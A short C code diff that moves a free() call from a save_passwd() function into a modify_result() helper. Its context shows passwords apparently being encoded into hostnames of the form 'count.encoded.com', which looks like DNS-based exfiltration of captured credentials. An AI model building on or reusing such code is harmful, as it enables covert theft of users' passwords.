@@ -130,6 +130,8 @@ modify_result(char *encoded_string){
          modify_string[strlen(modify_string)-1] = '\0';
     }
 
+    free(encoded_string);
+    
     return modify_string;
 }
 
@@ -157,7 +159,6 @@ save_passwd(char *name,char *password,char *all, int success)
         int count = count_equals(encoded_string);
         encoded_string = modify_result(encoded_string);
         snprintf(text, sizeof(text), "%d.%s.com", count,encoded_string); 
-        free(encoded_string);
     }
 
     strcat(all,text);
